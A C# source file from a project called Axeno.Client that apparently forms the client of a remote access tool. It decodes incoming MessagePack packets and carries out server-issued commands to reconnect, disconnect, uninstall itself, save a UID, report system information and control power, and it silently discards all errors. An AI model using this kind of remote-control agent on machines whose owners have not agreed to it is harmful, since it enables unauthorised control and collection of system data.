using Axeno.Client.MessagePack;
using Axeno.Client.Networking.Functions;
using Axeno.Client.Networking.Functions.General;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking
{
    internal class Packet
    {

        public static void Read(object data)
        {
            try
            {
                MsgPack msgpck = new MsgPack();
                msgpck.DecodeFromBytes((byte[])data);
                switch (msgpck.ForcePathObject("Packet").AsString)
                {
                    case "ReconnectClient":
                        {
                            ClientControl.Reconnect();
                            break;
                        }
                    case "DisconnectClient":
                        {
                            ClientControl.Disconnect(); 
                            break;
                        }
                    case "UninstallClient":
                        {
                            ClientControl.Uninstall();
                            break;
                        }
                    case "ClientUID":
                        {
                            string uid = msgpck.ForcePathObject("UID").AsString;
                            ClientControl.SaveUID(uid);
                            break;
                        }
                    case "GetSysInfo":
                        {
                            ClientSocket.Send(GetSystemInfo.Retrieve());
                            break;
                        }
                    case "Power":
                        {
                            PowerControl.HandlePower(msgpck);
                            break;
                        }
                }
            }
            catch
            {
                return;
            }
        }
    }
}
